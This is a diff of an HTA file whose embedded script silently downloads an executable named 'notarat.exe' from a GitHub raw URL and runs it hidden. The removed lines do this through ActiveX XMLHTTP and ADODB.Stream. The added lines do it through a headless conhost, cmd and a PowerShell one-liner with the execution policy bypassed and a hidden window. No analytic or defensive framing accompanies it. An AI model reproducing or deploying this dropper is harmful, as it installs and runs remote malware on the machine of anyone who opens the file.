@@ -1,39 +1,15 @@
 <html>
 <head>
-<HTA:APPLICATION 
-    ID="oHTA" 
-    APPLICATIONNAME="DeltaApp" 
-    BORDER="none" 
-    CAPTION="no" 
-    SHOWINTASKBAR="no" 
-    SINGLEINSTANCE="yes" 
-    SYSMENU="no" 
-    WINDOWSTATE="minimize">
+<HTA:APPLICATION>
 <script language="jscript">
-try {
-    var url = "https://raw.githubusercontent.com/sinnaiah/a/refs/heads/main/notarat.exe";
-    var filename = "notarat.exe";
-    var tempPath = new ActiveXObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") + "\\" + filename;
-    
-    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-    xhr.open("GET", url, false);
-    xhr.send();
-    
-    if (xhr.status == 200) {
-        var ado = new ActiveXObject("ADODB.Stream");
-        ado.Type = 1; // binary
-        ado.Open();
-        ado.Write(xhr.ResponseBody);
-        ado.SaveToFile(tempPath, 2); // overwrite
-        ado.Close();
-        
-        new ActiveXObject("WScript.Shell").Run(tempPath, 0, false);
-    }
-} catch(e) {
-    // Silently fail
-}
-self.close();
+var url = "https://raw.githubusercontent.com/sinnaiah/a/refs/heads/main/notarat.exe";
+var filename = "notarat.exe";
+var command = "conhost.exe --headless cmd.exe /c powershell.exe -w h -ep bypass -c \"$t=Join-Path $env:TEMP '" + filename + "';Invoke-WebRequest -Uri '" + url + "' -OutFile $t -UseBasicParsing;if(Test-Path $t){& conhost.exe --headless cmd.exe /c $t}\"";
+
+new ActiveXObject("WScript.Shell").Run(command, 0, false);
 </script>
 </head>
-<body></body>
+<body>
+<script>self.close();</script>
+</body>
 </html>
